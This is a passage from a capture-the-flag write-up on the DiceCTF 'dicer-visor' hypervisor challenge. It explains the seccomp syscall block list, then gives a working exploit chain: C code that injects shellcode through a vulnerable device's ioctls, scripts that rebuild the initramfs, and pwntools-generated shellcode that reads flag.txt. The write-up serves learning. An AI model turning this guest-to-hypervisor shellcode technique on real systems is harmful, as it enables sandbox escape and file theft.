+</span></span><span style=display:flex><span> 0007: 0x06 0x00 0x00 0x80000000  <span style=color:#66d9ef>return</span> KILL_PROCESS
+</span></span><span style=display:flex><span> 0008: 0x15 0x00 0x01 0x00000021  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> dup2<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0010</span>
+</span></span><span style=display:flex><span> 0009: 0x06 0x00 0x00 0x80000000  <span style=color:#66d9ef>return</span> KILL_PROCESS
+</span></span><span style=display:flex><span> 0010: 0x15 0x00 0x01 0x00000142  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> execveat<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0012</span>
+</span></span><span style=display:flex><span> 0011: 0x06 0x00 0x00 0x80000000  <span style=color:#66d9ef>return</span> KILL_PROCESS
+</span></span><span style=display:flex><span> 0012: 0x06 0x00 0x00 0x7fff0000  <span style=color:#66d9ef>return</span> ALLOW
+</span></span></code></pre></div><p>So, this is a blacklist of <code>socket</code>, <code>fork</code>, <code>dup2</code>, and <code>execveat</code> system calls. However, we can still use <code>open</code> and <code>write</code>, and the remote provides us the output of the hypervisor!</p><h2 id=exploitation>Exploitation</h2><p>So, let&rsquo;s create a userland program that when executed performs the trip to the <code>hypervisor</code> and executes some shellcode:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>//main.c
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/ioctl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/stat.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/mman.h&gt;</span><span style=color:#75715e>
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x90\x90\x90</span><span style=color:#e6db74>&#34;</span>; <span style=color:#75715e>//4x &#34;nop&#34; instruction
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>const</span> <span style=color:#66d9ef>size_t</span> shellcode_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span> argv) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/exploited-device&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;open&#34;</span>); <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>ssize_t</span> res <span style=color:#f92672>=</span> <span style=color:#a6e22e>write</span>(fd, shellcode, shellcode_len);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(res <span style=color:#f92672>!=</span> shellcode_len) {
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;write error. Written: %ld</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, res); <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( (res <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(fd, <span style=color:#ae81ff>0xdead</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) { <span style=color:#75715e>//write shellcode to supervisor
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;ioctl1&#34;</span>); <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ( (res <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(fd, <span style=color:#ae81ff>0xbeef</span>)) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) { <span style=color:#75715e>//invoke shellcode
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;ioctl2&#34;</span>); <span style=color:#a6e22e>exit</span>(<span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>Next, let&rsquo;s write a script that builds our userland program and re-creates the initramfs:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>set -e
+</span></span><span style=display:flex><span>gcc -static main.c -o main
+</span></span><span style=display:flex><span>mv main initramfs
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>cd initramfs
+</span></span><span style=display:flex><span>find . -print0 | cpio --null --create --verbose --format<span style=color:#f92672>=</span>newc | gzip --best &gt; ../initramfs_patched.cpio.gz
+</span></span><span style=display:flex><span>cd -
+</span></span></code></pre></div><p>Finally, we modify the <code>init</code> script to invoke our <code>main</code> program when the kernel boots:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>echo <span style=color:#ae81ff>1</span> &gt; /sys/module/rcutree/parameters/rcu_cpu_stall_suppress
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;Hello kernel world!&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>/sbin/insmod /vuln.ko
+</span></span><span style=display:flex><span>mknod /dev/exploited-device c <span style=color:#ae81ff>32</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>chmod ugo+x /main
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exec /main
+</span></span></code></pre></div><h3 id=shellcode-generation>Shellcode generation</h3><p>To generate our shellcode and dump the flag, we use <a href=https://github.com/Gallopsled/pwntools>pwntools</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># gen-shellcode.py</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set up pwntools for the correct architecture.</span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> elfexe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./dicer-visor&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>dumpShellcode</span>(shellcode):
+</span></span><span style=display:flex><span>    shellcode_str <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> b <span style=color:#f92672>in</span> shellcode:
+</span></span><span style=display:flex><span>        shellcode_str <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>x</span><span style=color:#e6db74>{:02x}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(b)
+</span></span><span style=display:flex><span>    msg  <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;const char *shellcode = &#34;</span><span style=color:#e6db74>{</span>shellcode_str<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;const size_t shellcode_len = </span><span style=color:#e6db74>{</span>len(shellcode)<span style=color:#e6db74>}</span><span style=color:#e6db74>;&#39;</span>
+</span></span><span style=display:flex><span>    print(msg)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span> asm(
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    xor     rdx, rdx /* O_RDONLY */
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#39;&#39;&#39;</span> <span style=color:#f92672>+</span>
+</span></span><span style=display:flex><span>    pwnlib<span style=color:#f92672>.</span>shellcraft<span style=color:#f92672>.</span>linux<span style=color:#f92672>.</span>cat(<span style=color:#e6db74>&#34;flag.txt&#34;</span>)
+</span></span><span style=display:flex><span>)
+</span></span><span style=display:flex><span>dumpShellcode(shellcode)
+</span></span></code></pre></div><p>When we execute <code>python gen-shellcode.py</code>, we get our C-style formatted shellcode which we can plug into our main.c:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fane@ctf-box:~/dicer-visor$ python gen-shellcode.py
+</span></span><span style=display:flex><span>const char *shellcode <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;\x48\x31\xd2\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05&#34;</span>;
+</span></span><span style=display:flex><span>const size_t shellcode_len <span style=color:#f92672>=</span> 47;
+</span></span></code></pre></div><h3 id=getting-the-flag>Getting the flag</h3><p>Finally we run <code>build.sh</code> to create the <code>initramfs_patched.cpio.gz</code> that contains the modified <code>init</code> script and our <code>main</code> binary. When we connect to the remote and provide our <code>initramfs_patched.cpio.gz</code> for the hypervisor to use, our userland program gets executed when the kernel boots, we perform the trip to the hypervisor, and dump the contents of <code>flag.txt</code>!</p><p><code>dice{dicer-visor-rules}</code></p></div></article><hr><p class=articleTagsContainer><span></span>
+<strong>Tags:</strong>
+<a href=/tags/ctf>#ctf</a>
+<a href=/tags/dicectf>#diceCTF</a>
+<a href=/tags/hypervisor>#hypervisor</a>
+<a href=/tags/pwn>#pwn</a></p></main><footer><hr><p><small>2023 &copy; Nikolaos Chalkiadakis</small></p><p><small><a href=https://gitlab.com/gabmus/hugo-ficurinia>Ficurinia theme</a> for <a href=https://gohugo.io>Hugo</a> by <a href=https://gabmus.org>Gabriele Musco</a>. Licensed under <a href=https://www.gnu.org/licenses/agpl-3.0.html>GNU AGPLv3</a>.</small></p></footer></div></div></div></body></html>
